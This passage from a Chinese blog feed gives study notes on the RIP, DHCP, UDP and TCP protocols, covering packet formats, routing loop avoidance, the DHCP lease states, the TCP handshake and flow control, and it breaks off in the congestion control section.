title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src=".\路由信息协议\RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src=".\路由信息协议\RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src=".\路由信息协议\水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src=".\路由信息协议\毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src=".\路由信息协议\触发更新.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态主机配置协议DHCP</title>
      <link href="/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/"/>
      <url>/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/</url>
      
        <content type="html"><![CDATA[<h3 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h3><p>[TOC]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP报文格式.png" style="zoom:50%;" /><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP状态转换.png" style="zoom: 50%;" /><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>传输层协议TCP与UDP</title>
      <link href="/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/"/>
      <url>/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src=".\传输协议UDP与TCP\进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src=".\传输协议UDP与TCP\UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src=".\传输协议UDP与TCP\套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src=".\传输协议UDP与TCP\UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src=".\传输协议UDP与TCP\UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src=".\传输协议UDP与TCP\TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src=".\传输协议UDP与TCP\TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src=".\传输协议UDP与TCP\TCP的控制字段.png" style="zoom:67%;" /><img src="./网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li>与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li>目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li>MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li>连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 Byte。</li></ul></blockquote><p>填充:为了使整个首部长度是4字节的整数倍，全0填充。</p><h5 id="TCP的封装："><a href="#TCP的封装：" class="headerlink" title="TCP的封装："></a>TCP的封装：</h5><p>TCP报文封装在lP数据报中，IP数据报的“协议类型”字段的值是6</p><img src=".\传输协议UDP与TCP\TCP的封装.png" style="zoom:67%;" /><h4 id="TCP链接的建立与释放："><a href="#TCP链接的建立与释放：" class="headerlink" title="TCP链接的建立与释放："></a>TCP链接的建立与释放：</h4><blockquote><p style="color:blue;">连接的三个阶段:连接建立、数据传送和连接释放。连接建立</p></blockquote><p>服务器首先准备接收TCP连接，这个过程叫做被动打开。这时的服务器的TCP已经准备好接受任何一台主机的TCP连接了。客户程序发出TCP请求的过程叫做主动打开。然后服务器与客户端就开始三次握手过程。</p><h5 id="三次握手建立连接："><a href="#三次握手建立连接：" class="headerlink" title="三次握手建立连接："></a>三次握手建立连接：</h5><p>1．客户发送第一个报文，这是一个SYN报文，在这个报文中只有SYN标志置为1，这个报文的作用是使序号同步。</p><img src=".\传输协议UDP与TCP\第一次握手.png" style="zoom:50%;" /><p>2．服务器发送第二个报文，即SYN+ACK报文，其中SYN和ACK标志被置为1首先，它是一个用来和对方进行通信的SYN报文。服务器使用这个报文同步初始序号，以便从服务器向客户发送字节。服务器还使用ACK标志确认已从客户端收到了SYN报文，同时给出期望从客户端收到的下一个序号。另外，服务器还定义了客户端要使用的接收窗口的大小。</p><img src=".\传输协议UDP与TCP\第二次握手.png" style="zoom:50%;" /><p>3．客户发送第三个报文。这仅仅是一个ACK报文。它使用ACK标志和确认号字段来确认收到了第二个报文。<br>然后客户端就可以通知上层应用进程，连接已经建立。服务器收到客户机的确认后，也通知上层应用进程，连接已经建立。</p><img src=".\传输协议UDP与TCP\第三次握手.png" style="zoom:50%;" /><h5 id="半关闭的四次握手方式终止连接："><a href="#半关闭的四次握手方式终止连接：" class="headerlink" title="半关闭的四次握手方式终止连接："></a>半关闭的四次握手方式终止连接：</h5><blockquote><p style="color:blue;">半关闭:TCP连接中，一方可以终止发送数据，但仍然保持接收数据，称为半关闭。半关闭通常是由客户端发起的。</p></blockquote><p><strong>半关闭的过程</strong></p><ol><li>客户发送FIN报文，半关闭了这个连接</li><li>服务器发送ACK报文接受了这个半关闭。但是，现在服务器仍然可以发送数据</li><li>当服务器已经把所有处理的数据都发送完毕时，就发送FIN报文</li><li>客户端发送ACK报文给予确认。<ul><li>在半关闭一条连接后，客户端仍然可以接收服务器发送的数据，而服务器也可以接收客户端发送的确认。但是，客户端不能传送数据给服务器。</li></ul></li></ol><img src=".\传输协议UDP与TCP\半关闭的四次握手方式终止连接.png" style="zoom:50%;" /><h4 id="流量控制："><a href="#流量控制：" class="headerlink" title="流量控制："></a>流量控制：</h4><p>发送端收到接收端的确认报文之前，对发送端发送的数据量进行管理</p><p>在不考虑流量控制的情况下，传输层协议可以每次只发送一个字节的数据，然后在发送下一个字节数据之前等待接收端的确认报文。这是一个非常缓慢的过程，发送端在等待确认报文时一直处于空闲状态。<br>还有一种情况是传输层协议一次就将全部数据发送出去，而不理会确认报文。这样虽然加速了发送过程，但可能会使接收端来不及接收而瘫痪。此外，若有一部分数据丢失、重复、失序或损坏，发送端就要一直等到接收端将全部数据都检查完毕后才能知道。</p><h4 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h4><p>TCP的流量控制在缓存上定义了一个窗口，称为滑动窗口，窗口大小的单位是字节，TCP发送数据的多少由滑动窗口决定。</p><p>TCP报文段首部的窗口字段就是给发送方设置的发送窗口的上限。</p><p>发送窗口在连接建立时由双方商定，在通信过程中动态调整。</p><p>如果发送方收到接收方的窗口大小U HIr以人tx’P送数据（带URG标志的数据段除外）。</p><img src=".\传输协议UDP与TCP\滑动窗口.png" style="zoom:67%;" /><p>发送端只要收到了对方的确认，发送窗口就可前移。<br>发送TCP维护一个指针。每发送一个报文段，指针向前移动一个报文段的距离。</p><blockquote><p style="color:red;">滑动窗口的右沿可以向左移动吗?</p>**滑动窗口的右沿向左移动通常发生在对方通知窗口缩小时**。使某些可以发送的数据变成不能发送，如果发送端已经发送了这些数据，就会产生错误。<p>TCP标准强烈不赞成这样做。</p></blockquote><blockquote><p style="color:red;">滑动窗口的左沿可以向左移动吗?</p>**窗口的左沿不能向左移动**，因为这表示已经发送出去的并且经过确认的数据现在又要回收了</blockquote><h4 id="拥塞控制："><a href="#拥塞控制：" class="headerlink" title="拥塞控制："></a>拥塞控制：</h4><h5 id="拥塞控制与流量控制的对比"><a href="#拥塞控制与流量控制的对比" class="headerlink" title="拥塞控制与流量控制的对比:"></a>拥塞控制与流量控制的对比:</h5><blockquote><p style="color:blue;">出现资源拥塞的条件:    对资源需求的总和>可用资源</p></blockquote><ul><li>防止过多的数据注入到网络中，可以使路由器或者链路不至于过载。</li><li>拥塞控制是一个<strong>全局性</strong>的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。</li></ul><p><strong>流量控制：</strong>在给定的发送端和接收端之间的<strong>点对点通信量的控制</strong>。</p><ul><li>流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收</li></ul><h5 